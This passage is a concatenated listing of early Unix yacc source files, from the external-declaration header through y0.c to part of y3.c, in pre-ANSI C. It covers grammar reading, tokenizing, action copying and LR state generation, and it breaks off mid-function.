extern int apstate[];		/* index to actions in amem by state */
extern int actsiz;  	/* size of the action table array */
extern int tystate[];	/* contains type information about the states */
  /* 0 = simple state, completely generated
     1 = state awaiting generation
     2 = state with an empty production in closure 
     */
extern int stsize ;	/* maximum number of states, at present */
extern int memsiz ;	/* maximum size for productions and states */
extern int mem0[] ; /* added production */
extern int *mem ;
extern int amem[];  /* action table storage */
extern int actsiz;  /* action table size */
extern int memact ;		/* next free action table position */
extern int nprod ;	/* number of productions */
extern int *prdptr[];	/* pointers to descriptions of productions */
extern int prdlim; /* the number of productions allowed */
extern int levprd[] ;	/* contains production levels to break conflicts */
  /* last two bits code associativity:
       0 = no definition
       1 = left associative
       2 = binary
       3 = right associative
     bit 04 is 1 if the production has an action
     the high 13 bits have the production level
     */
extern int nterms ;	/* number of terminals */
extern int nerrors;	/* number of errors */
extern int fatfl;  	/* if on, error is fatal */
  /*	the ascii representations of the terminals	*/
extern int extval;  /* start of output values */
extern struct sxxx1 {char *name; int value;} trmset[];
extern char cnames[];
extern int cnamsz;
extern char *cnamp;
extern int maxtmp ;	/* the size of the temp arrays */
 /* temporary vectors, indexable by states, terms, or nterms */
extern int temp1[];
extern int temp2[];
extern int trmlev[];	/* vector with the precedence of the terminals */
  /* The levels are the same as for levprd, but bit 04 is always 0 */
  /* the ascii representations of the nonterminals */
extern struct sxxx2 { char *name; } nontrst[];
extern int indgo[];		/* index to the stored goto table */
extern int ***pres; /* vector of pointers to the productions yielding each nonterminal */
extern struct looksets **pfirst; /* vector of pointers to first sets for each nonterminal */
extern int *pempty ; /* table of nonterminals nontrivially deriving e */
extern int nnonter ;	/* the number of nonterminals */
extern int lastred ;	/* the number of the last reduction of a state */
extern int ftable;		/* y.tab.c file */
extern int foutput;		/* y.output file */
extern int cin;		/* current input file */
extern int cout;		/* current output file */
extern int arrndx;
extern int zzcwset;
extern int zzpairs ;
extern int zzgoent ;
extern int zzgobest ;
extern int zzacent ;
extern int zzacsave ;
extern int zznsave ;
extern int zzclose ;
extern int zzrrconf ;
extern int zzsrconf ;
extern char *ctokn;
struct {int **ppi;} ;
extern int ntlim ;	/* maximum number of nonterminals */
extern int tlim ;	/* maximum number of terminals */
extern int lineno; /* current line number */
extern int peekc; /* look-ahead character */
extern int tstates[];
extern int ntstates[];
extern int mstates[];

extern struct looksets clset;
extern struct looksets lkst[];
extern int nlset;  /* next lookahead set index */
extern int lsetsz; /* number of lookahead sets */

extern struct wset { int *pitem, flag, ws[ _tbitset ]; } wsets[];
extern int cwset;
extern int wssize;

extern int numbval;  /* the value of an input number */
extern int rflag;  /* ratfor flag */
extern int oflag;  /* optimization flag */
extern int ndefout;  /* number of defined symbols output */

extern int machine;

# define UNIX 1
# define GCOS 2
# define IBM 3
-- /usr/source/yacc/source/y0.c mode=0100664 uid=3 gid=3 atime=174924619 mtime=169260992 --
# define _actsize 1500
# define _memsize 3500
# define _nstates 400
# define _nterms 95
# define _nprod 250
# define _nnonterm 100
# define _tempsize 400
# define _cnamsz 2000
# define _lsetsize 200
# define _wsetsize 150

# define _tbitset 6

int tbitset;  /* size of lookahed sets */
int nolook 0; /* flag to suppress lookahead computations */
struct looksets { int lset[ _tbitset ]; } ;
struct item { int *pitem; } ;

/* this file contains the definitions for most externally known data */

int nstate 0;		/* number of states */
struct item *pstate[_nstates];	/* pointers to the descriptions of the states */
int apstate[_nstates];	/* index to the actions for the states */
int tystate[_nstates];	/* contains type information about the states */
int stsize _nstates;	/* maximum number of states, at present */
int memsiz _memsize;	/* maximum size for productions and states */
int mem0[_memsize] ; /* production storage */
int *mem mem0;
int amem[_actsize];  /* action table storage */
int actsiz _actsize; /* action table size */
int memact 0;		/* next free action table position */
int nprod 1;	/* number of productions */
int *prdptr[_nprod];	/* pointers to descriptions of productions */
int prdlim _nprod ;  /* the maximum number of productions */
	/* levprd - productions levels to break conflicts */
int levprd[_nprod] {0,0};
  /* last two bits code associativity:
       0 = no definition
       1 = left associative
       2 = binary
       3 = right associative
     bit 04 is 1 if the production has an action
     the high 13 bits have the production level
     */
int nterms 0;	/* number of terminals */
int tlim _nterms ; /* the maximum number of terminals */
/*	the ascii representations of the terminals	*/
int extval 0;  /* start of output values */
struct sxxx1 {char *name; int value;} trmset[_nterms];
char cnames[_cnamsz];
int cnamsz _cnamsz;
char *cnamp;
int maxtmp _tempsize;	/* the size of the temp1 array */
int temp1[_tempsize]; /* temporary storage, indexed by terms + nterms or states */
int temp2[_nnonterm]; /* temporary storage indexed by nonterminals */
int trmlev[_nterms];	/* vector with the precedence of the terminals */
  /* The levels are the same as for levprd, but bit 04 is always 0 */
/* the ascii representations of the nonterminals */
struct sxxx2 { char *name; } nontrst[_nnonterm];
int ntlim _nnonterm ; /* limit to the number of nonterminals */
int indgo[_nstates];		/* index to the stored goto table */
int ***pres; /* vector of pointers to the productions yielding each nonterminal */
struct looksets **pfirst; /* vector of pointers to first sets for each nonterminal */
int *pempty 0 ; /* table of nonterminals nontrivially deriving e */
int nnonter -1;	/* the number of nonterminals */
int lastred 0;	/* the number of the last reduction of a state */
int ftable;		/* y.tab.c file */
int foutput;		/* y.output file */
int arrndx; /* used in the output of arrays on y.tab.c */
int zzcwset 0;
int zzpairs 0;
int zzgoent 0;
int zzgobest 0;
int zzacent 0;
int zzacsave 0;
int zznsave 0;
int zzclose 0;
int zzsrconf 0;
int zzrrconf 0;
char *ctokn;
int lineno 1; /* current input line number */
int peekc -1; /* look-ahead character */
int tstates[ _nterms ]; /* states generated by terminal gotos */
int ntstates[ _nnonterm ]; /* states generated by nonterminal gotos */
int mstates[ _nstates ]; /* chain of overflows of term/nonterm generation lists  */

struct looksets clset;
struct looksets lkst [ _lsetsize ];
int nlset 0; /* next lookahead set index */
int lsetsz _lsetsize; /* number of lookahead sets */

struct wset { int *pitem, flag, ws[_tbitset]; } wsets[ _wsetsize ];
int cwset;
int wssize _wsetsize;

int numbval;  /* the value of an input number */
int rflag 0;  /* ratfor flag */
int oflag 0;  /* optimization flag */

int ndefout 3;  /* number of defined symbols output */
int nerrors 0;	/* number of errors */
int fatfl 1;  	/* if on, error is fatal */
int machine;   /* has a number describing the machine */
-- /usr/source/yacc/source/y1.c mode=0110664 uid=3 gid=3 atime=174924626 mtime=169260992 --
# include "dextern"
  /*     * * * *    y a c c     * * * *     */

  /*      features to be fixed up ...

  ***  Print estimate of total space needed for parser
  ***  Either list inputs on y.output, or list empty prdn's in states
  ***  Mention nonterms not used (or, rules. not reduced) as nonfatal error
  ***  Output states where conflicts were found by default on y.output
  ***  Engage in newspeak: production=>grammar rules, term=>token, etc.
  ***  handle # define, #ifdef, etc., in yacc actions, %{ %}
  */

  /*      new features to be added

  ***  reductions by single productions ( by request )
  ***  follow sets for start symbol
  ***  option to only do slr(1)
  ***  easily changed array names on output
  ***  allocate core, rather than predefined
  ***  input controlled by a grammar
  ***  support multiple choices for  conflicts
  ***  better conflict diagnostics
  */



main(argc,argv) int argc; char *argv[]; {
  auto int n;

  whereami();
  setup(argc,argv); /* initialize and read productions */
  tbitset = (nterms+16)/16;
  cpres(); /* make table of which productions yield a given nonterminal */
  cempty(); /* make a table of which nonterminals can match the empty string */
  cpfir(); /* make a table of e free first lists */
  stagen(); /* generate the states */
  output();  /* write the states and the tables */
  go2out();
  summary();
  windup();
  }

whereami(){ /* sets the variable machine to UNIX, GCOS, or IBM */

  int i;

  i = 1;
  i = i << 30;
  if( i == 0 ) {
    machine = UNIX;
    return;
    }
  i = i << 4;
  if( i == 0 ){
    machine = IBM;
    return;
    }
  machine = GCOS;
  }

windup(){
  /* no errors, do the optimization if appropriate */
  char *cp;
  int i;

  cflush(1);
  if( !oflag ) cexit(0);

  for( i=3; i<10; ++i ) cclose(i);
  switch( machine ){

  case GCOS:
    if( rflag ){
      if( foutput<0 ) system( "./yopt -r" );
      else system( "./yopt -rv" );
      }
    else {
      if( foutput<0 ) system( "./yopt" );
      else system( "./yopt -v" );
      }
    cexit(0);  /* terminate */

  case UNIX:
    cp = "/usr/yacc/yopti";
    if( rflag ) execl( cp, cp, (foutput<0)?"-r":"-rv", 0 );
    else if( foutput<0 ) execl( cp, cp, 0 );
    else execl( cp, cp, "-v", 0 );
    error( "optimization execl call fails" );

  case IBM:
    if( rflag ){
      if( foutput<0 ) system( "MH2019.yaccopt -r" );
      else system( "MH2019.yaccopt -rv" );
      }
    else {
      if( foutput<0 ) system( "MH2019.yaccopt" );
      else system( "MH2019.yaccopt -v" );
      }
    cexit(0);

    }

  }

settty()
/*	sets the output file to y.output */
{	
	cflush( foutput );  /* a bit of a cheat */
	cout = foutput;
	}

settab(){ /* sets the output file to y.tab.c */
	
	cflush( ftable );
	cout = ftable;
	}

char *chcopy( p, q )  char *p, *q; {
	/* copies string q into p, returning next free char ptr */
	while( *p = *q++ ) ++p;
	return( p );
	}

char *writem(pp) struct item *pp; { /* creates output string for item pointed to by pp */
	int i,*p;
	static char sarr[100];
	char *q;

	for( p=pp->pitem; *p>0 ; ++p ) ;
	p = prdptr[-*p];
	q = chcopy( sarr, nontrst[*p-NTBASE].name );
	q = chcopy( q, " : " );

	for(;;){
		*q++ = ++p==(pp->pitem) ? '_' : ' ';
		if((i = *p) <= 0) break;
		q = chcopy( q, symnam(i) );
		}

	*q = '\0' ;
	return( sarr );
	}

char *symnam(i){ /* return a pointer to the name of symbol i */
	char *cp;

	cp = (i>=NTBASE) ? nontrst[i-NTBASE].name : trmset[i].name ;
	if( *cp == ' ' ) ++cp;
	return( cp );
	}

summary(){ /* output the summary on the tty */

  int i, s, *pn;
  

	if( !rflag ){
		settab();
		printf("\nint nterms %d;",nterms);
		printf("\nint nnonter %d;", nnonter);
		printf("\nint nstate %d;", nstate);
		printf("\nchar *yysterm[] {");
		for (i=1;i<=nterms;i++) if( trmset[i].value >= 0400 ) printf("\n\"%s\",",symnam(i));
		printf( "\n0 };\n" );
		printf("\nchar *yysnter[] {");
		for (i=0;i<nnonter;i++) printf("\n\"%s\",",nontrst[i].name);
		printf("\n\"%s\" };\n",nontrst[nnonter].name);
		}

  settty();
  printf("\n%d/%d terminals, %d/%d nonterminals\n", nterms, tlim,
      nnonter, ntlim );
  printf("%d/%d grammar rules, %d/%d states\n", nprod, prdlim, nstate, stsize );
  printf("%d shift/reduce, %d reduce/reduce conflicts reported\n", zzsrconf, zzrrconf );
  pn = pstate[nstate+1];
  printf("%d/%d working sets used\n", zzcwset,  wssize );
  printf("memory: states,etc. %d/%d, parser %d/%d\n", pn-mem0, memsiz,
      memact, actsiz );
  printf("%d/%d distinct lookahead sets\n", nlset, lsetsz );
  printf("%d extra closures\n", zzclose - 2*nstate );
  printf("%d action entries\n", zzacent );
  printf("%d action entries saved through merging %d states\n",zzacsave,zznsave);
  printf("%d goto entries\n", zzgoent );
  printf("%d entries saved by goto default\n", zzgobest );
  if( zzsrconf!=0 || zzrrconf!=0 ){
    cflush( errfileno );
    cout = errfileno;
    printf("\nconflicts: ");
    if( zzsrconf )printf( "%d shift/reduce" , zzsrconf );
    if( zzsrconf && zzrrconf )printf( ", " );
    if( zzrrconf )printf( "%d reduce/reduce" , zzrrconf );
    printf( "\n" );
    }
  }

error(s,a1){ /* write out error comment */
	
	int c;
	++nerrors;
	cflush( errfileno );
	cout = errfileno;   /* set output to tty */
	printf("\n fatal error: ");
	printf(s,a1);
        printf(", line %d\n", lineno );
	if( !fatfl ) return;
	summary();
	cexit(1);
	}

arrset(s) char s[]; {
	printf("\nint %s[] {0", s );
	arrndx = 1;
	}

arrval(n){
	printf(",%d",n);
	if( (++arrndx%10) == 0 ) printf("\n");
	}

arrdone(){
	printf(",-1};\n");
	}

copy(v) char *v; {	/* copy ctokn to v */
	char *p;

	p=ctokn;
	while( *v++ = *p++ );
	}

compare(v) char *v; {	/* compare ctokn with v */
	char *p;

	for( p=ctokn; ; ++p ){
		if( *p != *v++ ) return( 0 );
		if( *p == 0 ) return(1);
		}
	}

int *yalloc(n){ /* allocate n+1 words from vector mem */
	int *omem;
	omem = mem;
	mem =+ n+1;
	if(mem-mem0 >= memsiz) error("memory overflow");
	return(omem);
	}

aryfil( v, n, c ) int *v,n,c; { /* set elements 0 through n-1 to c */
  int i;
  for( i=0; i<n; ++i ) v[i] = c;
  }

union( a, b, c ) int *a, *b, *c; {
  /* set a to the union of b and c */
  /* a may equal b */
  /* return 1 if c is not a subset of b, 0 otherwise */

  _REGISTER int i, x, sub;

  sub = 0;
  for( i=0; i<tbitset; ++i ){
    x = b[i] | c[i];
    if( x != b[i] ) sub=1;
    a[i] = x;
    }
  return( sub );
  }

prlook( pp ) int *pp;{
	int j;
	pp = pp->lset;
	if( pp == 0 ) printf("\tNULL");
	else {
		printf(" { " );
		for( j=1; j<=nterms; ++j ){
			if( (pp[j>>4]>>(j&017) )&01 != 0 ) printf( "%s ", symnam(j) );
			}
		printf( "}" );
		}
	}
-- /usr/source/yacc/source/y2.c mode=0110664 uid=3 gid=3 atime=174924642 mtime=169260992 --
# include "dextern"
# define IDENTIFIER 257
# define MARK 258
# define TERM 259
# define LEFT 260
# define BINARY 261
# define RIGHT 262
# define PREC 263
# define LCURLY 264
# define C_IDENTIFIER 265  /* name followed by colon */
# define NUMBER 266

setup(argc,argv) int argc; char *argv[];
{	int i,j,lev,t;
	int c;

	foutput = -2;
	i = 1;
	while( argc >= 2  && argv[1][0] == '-' ) {
		while( *++(argv[1]) ){
			switch( *argv[1] ){
			case 'v':
			case 'V':
				foutput = copen("y.output", 'w' );
				if( foutput < 0 ) error( "cannot open y.output");
				continue;
			case 'o':
			case 'O':
				oflag = 1;
				continue;
			case 'r':
			case 'R':
				oflag = 1;
				rflag = 1;
				continue;
			default:  error( "illegal option: %c", *argv[1]);
				}
			}
		argv++;
		argc--;
		}

	ftable = copen( oflag ? "yacc.tmp" : "y.tab.c" , 'w' );
	if( ftable<0 ) error( "cannot open table file" );
	if( argc > 1 ) cin = copen( argv[1], 'r' );
	if( cin < 0 ) error( "cannot open input" );
	settab();
	printf("#\n");
	ctokn = "$end";
	defin(0);  /* eof */
	extval = 0400;  /* beginning of assigned values */
	ctokn = "error";
	defin(0);
	ctokn = "$accept";
	defin(1);
	mem=mem0;
	cnamp = cnames;
	lev=0;
	i=0;

	while( t = gettok() ){
		switch( t ){
			case IDENTIFIER:	j = chfind(0);
					trmlev[j] = lev;
					continue;
			case ',':
			case ';':		continue;
			case TERM:		lev=0; continue;
			case LEFT:		lev=(++i<<3)|01; continue;
			case BINARY:	lev=(++i<<3)|02; continue;
			case RIGHT:	lev=(++i<<3)|03; continue;
			case MARK:
					defout();
					if( rflag ){ /* RATFOR */
						printf( "define yyerrok yyerrf = 0\n" );
						printf( "define yyclearin yychar = -1\n" );
						printf( "subroutine yyactr(yyprdn)\n");
						printf( "common/yycomn/yylval,yyval,yypv,yyvalv(150)\n" );
						printf( "common/yylcom/yychar,yyerrf,yydebu\n" );
						printf( "integer yychar, yyerrf, yydebu\n" );
						printf( "integer yyprdn,yyval,yylval,yypv,yyvalv\n" );
						}
					else {
						printf( "#define yyclearin yychar = -1\n" );
						printf( "#define yyerrok yyerrflag = 0\n" );
						printf( "extern int yychar, yyerrflag;\n" );
						printf("\nint yyval 0;\nint *yypv;\nint yylval 0;");
						printf("\nyyactr(__np__){\n");
						}
					break;
			case LCURLY:	defout();
					cpycode();
					continue;
			case NUMBER:
				trmset[j].value = numbval;
				if( j < ndefout && j>2 ) 
					error("please define type # of %s earlier", trmset[j].name );
				continue;
			default:	error("bad precedence syntax, input %d", t );
			}
		break;
		}
	prdptr[0]=mem;
	/* added production */
	*mem++ = NTBASE;
	*mem++ = NTBASE+1;
	*mem++ = 1;
	*mem++ = 0;
	prdptr[1]=mem;
	i=0;

	/* i is 0 when a rule can begin, 1 otherwise */

	for(;;) switch( t=gettok() ) {
	case C_IDENTIFIER:		if( mem == prdptr[1] ) {  /* first time */
						if( rflag ){
							printf( "goto 1000\n" );
							}
						else printf("\nswitch(__np__){\n");
						}
				if( i != 0 ) error( "previous rule not terminated" );
				*mem = chfind(1);
				if( *mem < NTBASE )error( "token illegal on lhs of grammar rule" );
				i=1;
				++mem;
				continue;
	case IDENTIFIER:
			*mem=chfind(1);
			if(*mem < NTBASE)levprd[nprod]=trmlev[*mem];
			mem++;
			if(i==0) error("missing :");
			continue;
	case '=':		levprd[nprod] =| 04;
				if( i==0 ) error("semicolon preceeds action");
			printf( rflag?"\n%d ":"\ncase %d:", nprod );
			cpyact();
			printf( rflag ? " return" : " break;" );
	case '|':
	case ';':		if(i){
				*mem++ = -nprod;
				prdptr[++nprod] = mem;
				levprd[nprod]=0;
				i=0;}
			if (t=='|'){i=1;*mem++ = *prdptr[nprod-1];}
			continue;
	case 0:		/* End Of File */
	case MARK:	if( i != 0 ) error( "rule not terminated before %%%% or EOF" );
			settab();
			finact();
			/* copy the programs which follow the rules */
			if( t == MARK ){
				while (c=getchar()) putchar(c);
				}
			return;
	case PREC:	
		if( i==0 ) error( "%%prec must appear inside rule" );
		if( gettok()!=IDENTIFIER)error("illegal %%prec syntax" );
		j=chfind(2);
		if(j>=NTBASE)error("nonterminal %s illegal after %%prec", nontrst[j-NTBASE].name);
		levprd[nprod]=trmlev[j];
		continue;
	case LCURLY:	
		if( i!=0 ) error( "%%{ appears within a rule" );
		cpycode();
		continue;
	default: error( "syntax error, input %d", t  );
	}
}

finact(){
	/* finish action routine */
	register i;

	if( rflag ){

		printf( "\n1000 goto(" );
		for( i=1; i<nprod; ++i ){
			printf( "%d,", (levprd[i]&04)==0?999:i );
			}
		printf( "999),yyprdn\n" );
		printf( "999 return\nend\n" );
		printf( "define YYERRCODE %d\n", trmset[2].value );
		}
	else {
		printf( "\n}\n}\n" );
		printf( "int yyerrval %d;\n", trmset[2].value );
		}
	}
defin(t) {
/*	define ctokn to be a terminal if t=0
	or a nonterminal if t=1		*/
	char *cp,*p;
	int c;


        if (t) {
          if( ++nnonter >= ntlim ) error("too many nonterminals, limit %d",ntlim);
	  nontrst[nnonter].name = ctokn;
	  return( NTBASE + nnonter );
          }
        else {
          if( ++nterms >= tlim ) error("too many terminals, limit %d",tlim );
          trmset[nterms].name = ctokn;
	if( ctokn[0]==' ' && ctokn[2]=='\0' ) /* single character literal */
		trmset[nterms].value = ctokn[1];
	else if ( ctokn[0]==' ' && ctokn[1]=='\\' ) { /* escape sequence */
		if( ctokn[3] == '\0' ){ /* single character escape sequence */
			switch ( ctokn[2] ){
				 /* character which is escaped */
			case 'n': trmset[nterms].value = '\n'; break;
			case 'r': trmset[nterms].value = '\r'; break;
			case 'b': trmset[nterms].value = '\b'; break;
			case 't': trmset[nterms].value = '\t'; break;
			case '\'': trmset[nterms].value = '\''; break;
			case '"': trmset[nterms].value = '"'; break;
			case '\\': trmset[nterms].value = '\\'; break;
			default: error( "invalid escape" );
				}
			}
		else if( ctokn[2] <= '7' && ctokn[2]>='0' ){ /* \nnn sequence */
			if( ctokn[3]<'0' || ctokn[3] > '7' || ctokn[4]<'0' ||
				ctokn[4]>'7' || ctokn[5] != '\0' ) error("illegal \\nnn construction" );
			trmset[nterms].value = 64*(ctokn[2]-'0')+8*(ctokn[3]-'0')+ctokn[4]-'0';
			if( trmset[nterms].value == 0 ) error( "'\\000' is illegal" );
			}
		}
	else {
		trmset[nterms].value = extval++;

		}
	trmlev[nterms] = 0;
	return( nterms );
          }
}

defout(){ /* write out the defines (at the end of the declaration section) */

	_REGISTER int i, c;
	_REGISTER char *cp;

	for( i=ndefout; i<=nterms; ++i ){

		cp = trmset[i].name;
		if( *cp == ' ' ) ++cp;  /* literals */

		for( ; (c= *cp)!='\0'; ++cp ){

			if( c>='a' && c<='z' ||
			    c>='A' && c<='Z' ||
			    c>='0' && c<='9' ||
			    c=='_' )  ; /* VOID */
			else goto nodef;
			}

		/* define it */

		printf( "%c define %s %d\n", rflag?' ':'#', trmset[i].name, trmset[i].value );

	nodef:	;
		}

	ndefout = nterms+1;

	}

chstash( c ){
  /* put character away into cnames */
  if( cnamp >= &cnames[cnamsz] ) error("too many characters in id's and literals" );
  else *cnamp++ = c;
  }

int gettok() {
	int j, base;
	static int peekline; /* number of '\n' seen in lookahead */
	auto int c, match, reserve;

begin:
	reserve = 0;
        if( peekc>=0 ) {
		c = peekc;
		lineno =+ peekline;
		peekc = -1;
		peekline = 0;
		}
        else c = getchar();
        while( c==' ' || c=='\n' || c=='\t' ){
          if( c == '\n' ) ++lineno;
          c=getchar();
          }
	if (c=='/')
		{if (getchar()!='*')error("illegal /");
		c=getchar();
		while(c) {
			if( c == '\n' ) ++lineno;
			if (c=='*')
				{if((c=getchar())=='/')break;}
			else c=getchar();}
		if (!c) return(0);
		goto begin;}
	j=0;
	switch(c){
	case '"':	
	case '\'':	match = c;
			ctokn = cnamp;
			chstash( ' ' );
			while(1){
				c = getchar();
				if( c == '\n' || c == '\0' )
					error("illegal or missing ' or \"");
				if( c == '\\' ){
					c = getchar();
					chstash( '\\' );
					}
				else if( c == match ) break;
				chstash( c );
				}
			break;
	case '%':
	case '\\':	switch(c=getchar())
		{case '0':	return(TERM);
		case '<':	return(LEFT);
		case '2':	return(BINARY);
		case '>':	return(RIGHT);
		case '%':
		case '\\':	return(MARK);
		case '=':	return(PREC);
		case '{':	return(LCURLY);
		default:	reserve = 1;
		}
	default:	if( c >= '0' && c <= '9' ){ /* number */
				numbval = c-'0' ;
				base = (c=='0') ? 8 : 10 ;
				for( c=getchar(); c>='0' && c<='9'; c=getchar() ){
					numbval = numbval*base + c - '0';
					}
				peekc = c;
				return(NUMBER);
				}
			else if( (c>='a'&&c<='z')||(c>='A'&&c<='Z')||c=='_'||c=='.'||c=='$'){
				ctokn = cnamp;
				while(	(c>='a'&&c<='z') ||
					(c>='A'&&c<='Z') ||
					(c>='0'&&c<='9') ||
					c=='_' || c=='.' || c=='$' ) {
					chstash( c );
					if( peekc>=0 ) { c = peekc; peekc = -1; }
					else c = getchar();
					}
				}
			else return(c);

			peekc=c;
			}
	chstash( '\0' );

	if( reserve ){ /* find a reserved word */
		if( compare("term")) return( TERM );
		if( compare("TERM")) return( TERM );
		if( compare("token")) return( TERM );
		if( compare("TOKEN")) return( TERM );
		if( compare("left")) return( LEFT );
		if( compare("LEFT")) return( LEFT );
		if( compare("nonassoc")) return( BINARY );
		if( compare("NONASSOC")) return( BINARY );
		if( compare("binary")) return( BINARY );
		if( compare("BINARY")) return( BINARY );
		if( compare("right")) return( RIGHT );
		if( compare("RIGHT")) return( RIGHT );
		if( compare("prec")) return( PREC );
		if( compare("PREC")) return( PREC );
		error("invalid escape, or illegal reserved word: %s", ctokn );
		}

	/* look ahead to distinguish IDENTIFIER from C_IDENTIFIER */

  look:
	while( peekc==' ' || peekc=='\t' || peekc == '\n' ) {
		if( peekc == '\n' ) ++peekline;
		peekc = getchar();
		}

	if( peekc != ':' ) return( IDENTIFIER );
	peekc = -1;
	lineno =+ peekline;
	peekline = 0;
	return( C_IDENTIFIER );
}
chfind(t)

{	int i,j;

	if (ctokn[0]==' ')t=0;
	for(i=1;i<=nterms;i++)
		if(compare(trmset[i].name)){
			cnamp = ctokn;
			return( i );
			}
	for(i=1;i<=nnonter;i++)
		if(compare(nontrst[i].name)) {
			cnamp = ctokn;
			return( i+NTBASE );
			}
	/* cannot find name */
	if( t>1 && ctokn[0] != ' ' )
		error( "%s should have been defined earlier", ctokn );
	return( defin( t ) );
	}

cpycode(){ /* copies code between \{ and \} */

	int c;
	c = getchar();
	if( c == '\n' ) {
		c = getchar();
		lineno++;
		}
	while( c ){
		if( c=='\\' )
			if( (c=getchar()) == '}' ) return;
			else putchar('\\');
		if( c=='%' )
			if( (c=getchar()) == '}' ) return;
			else putchar('%');
		putchar( c );
		if( c == '\n' ) ++lineno;
		c = getchar();
		}
	error("eof before %%}");
	}

cpyact(){ /* copy C action to the next ; or closing } */
	int brac, c, match, *i, j, s;

	brac = 0;

loop:
	c = getchar();
swt:
	switch( c ){

case ';':
		if( brac == 0 ){
			putchar( c );
			return;
			}
		goto lcopy;

case '{':
		brac++;
		goto lcopy;

case '$':
		s = 1;
		c = getchar();
		if( c == '$' ){
			printf("yyval");
			goto loop;
			}
		if( c == '-' ){
			s = -s;
			c = getchar();
			}
		if( c>='0' && c <= '9' ){
			j=0;
			while( c>='0' && c<= '9' ){
				j= j*10+c-'0';
				c = getchar();
				}
			if( rflag ) printf( "yyvalv(yypv%c%d)", s==1?'+':'-', j );
			else printf("yypv[%d]", s*j );
			goto swt;
			}
		putchar( '$' );
		if( s<0 ) putchar('-');
		goto swt;

case '}':
		brac--;
		if( brac == 0 ){
			putchar( c );
			return;
			}
		goto lcopy;

case '/':	/* look for comments */
		putchar( c );
		c = getchar();
		if( c != '*' ) goto swt;

		/* it really is a comment */

		putchar( c );
		while( c=getchar() ){
			if( c=='*' ){
				putchar( c );
				if( (c=getchar()) == '/' ) goto lcopy;
				}
			putchar( c );
			}
		error( "EOF inside comment" );

case '\'':	/* character constant */
		match = '\'';
		goto string;

case '"':	/* character string */
		match = '"';

	string:

		putchar( c );
		while( c=getchar() ){

			if( c=='\\' ){
				putchar( c );
				c=getchar();
				}
			else if( c==match ) goto lcopy;
			putchar( c );
			}
		error( "EOF in string or character constant" );

case '\0':
		error("action does not terminate");
case '\n':	++lineno;
		goto lcopy;

		}

lcopy:
	putchar( c );
	goto loop;
	}
-- /usr/source/yacc/source/y3.c mode=0110664 uid=3 gid=3 atime=174924668 mtime=169260992 --
# include "dextern"

cpres(){ /* conpute an array with the beginnings of  productions yielding given nonterminals
	The array pres points to these lists */
	int i,j,c;
	pres = yalloc(nnonter+1);
	for(i=0;i<=nnonter;i++){
		c = i+NTBASE;
		pres[i] = mem;
		fatfl = 0;  /* make undefined  symbols  nonfatal */
		for(j=0;j<nprod;j++)
		if (*prdptr[j] == c) *mem++ =  prdptr[j]+1;
		if(pres[i] == mem){
			error("nonterminal %s not defined!", nontrst[i].name);
			}
		}
	pres[i] = mem;
	fatfl = 1;
	if( nerrors ){
		summary();
		cexit(1);
		}
	}

int indebug 0;
cpfir() {
  /* compute an array with the first of nonterminals */
  int i, ch, **s, **t, changes, *p;

  pfirst = yalloc(nnonter+1);
  for (i=0;i<=nnonter;i++) {
    aryfil( wsets[i].ws, tbitset, 0 );
    t = pres[i+1];
    for( s=pres[i]; s<t; ++s ){ /* initially fill the sets */
      for( p = *s; (ch = *p) > 0 ; ++p ) {
        if( ch < NTBASE ) {
          wsets[i].ws[ch>>4] =| (1 << (ch&017) );
          break;
          }
        else if( !pempty[ch-NTBASE] ) break;
        }
      }
    }

  /* now, reflect transitivity */

  changes = 1;
  while( changes ){
    changes = 0;
    for( i=0; i<=nnonter; ++i ){
      t = pres[i+1];
      for( s=pres[i]; s<t; ++s ){
        for( p = *s; ( ch = (*p-NTBASE) ) >= 0; ++p ) {
          changes =| union( wsets[i].ws, wsets[i].ws, wsets[ch].ws );
          if( !pempty[ch] ) break;
          }
        }
      }
    }

  for( i=0; i<=nnonter; i++ ) pfirst[i] = flset( wsets[i].ws );
  if( !indebug ) return;
  settty();
  for( i=0; i<=nnonter; i++ ){
    printf( "\n%s: ", nontrst[i].name );
    prlook( pfirst[i] );
    printf( " %d\n", pempty[i] );
    }
  }

state(c){ /* sorts last state,and sees if it equals earlier ones. returns state number */
	int s,size1,size2;
	_REGISTER i;
	struct item *p1, *p2, *k, *l, *q1, *q2;
	p1 = pstate[nstate];
	p2 = pstate[nstate+1];
	if(p1==p2) return(0); /* null state */
	/* sort the items */
	for(k=p2-1;k>p1;k--) {	/* make k the biggest */
		for(l=k-1;l>=p1;--l)if( l->pitem > k->pitem ){
			s = k->pitem;
			k->pitem = l->pitem;
			l->pitem = s;
			s = k->look;
			k->look = l->look;
			l->look = s;
			}
		}
	size1 = p2 - p1; /* size of state */

	for( i= (c>=NTBASE)?ntstates[c-NTBASE]:tstates[c]; i != 0; i = mstates[i] ) {
		/* get ith state */
		q1 = pstate[i];
		q2 = pstate[i+1];
		size2 = q2 - q1;
		if (size1 != size2) continue;
		k=p1;
		for(l=q1;l<q2;l++) {
			if( l->pitem != k->pitem ) break;
			++k;
			}
		if (l != q2) continue;
		/* found it */
		pstate[nstate+1] = pstate[nstate]; /* delete last state */
		/* fix up lookaheads */
		k=p1;
		for( l=q1; l<q2; ++l ){
			if( union( clset.lset, l->look->lset, k->look->lset ) ) {
				tystate[i] = 1;
				/* register the new set */
				l->look = flset( &clset );
				}
			++k;
			}
		return (i);
		}
/* state is new */
	pstate[nstate+2] = p2;
	if(nstate+1 >= stsize) error("too many states");
	if( c >= NTBASE ){
		mstates[ nstate ] = ntstates[ c-NTBASE ];
		ntstates[ c-NTBASE ] = nstate;
		}
	else {
		mstates[ nstate ] = tstates[ c ];
		tstates[ c ] = nstate;
		}
	tystate[nstate]=1;
	return(nstate++);
	}

int pidebug 0; /* debugging flag for putitem */
putitem ( ptr, lptr )		int *ptr; struct looksets *lptr;{
	int *jip, k;
	struct item *i, *j;

        if( pidebug ) {
          settty();
	  printf("putitem(%s), state %d\n", writem(&ptr), nstate );
          }
	/* see if it's there */
	j = pstate[nstate+1];
        for( i=pstate[nstate]; i<j; ++i )
		if(i->pitem == ptr) { 
			error("yacc error--duplicate item");
			}
	/* not there */
	j->pitem = ptr;
	j->look = flset( lptr );
	pstate[nstate+1] = ++j;
	jip = j;
	if(jip-mem0 >= memsiz) error("out of state space");
	}

cempty(){ /* mark nonterminals which derive the empty string */

  int i, *p;

  /* set pempty to 0 */
  pempty = yalloc( nnonter );
  aryfil( pempty, nnonter+1, 0 );
  for( i=1; i<nprod; ++i ) /* loop over productions */
    if( prdptr[i][1] <= 0 ) /* i is empty production */
      pempty[ *prdptr[i]-NTBASE ] = 1;

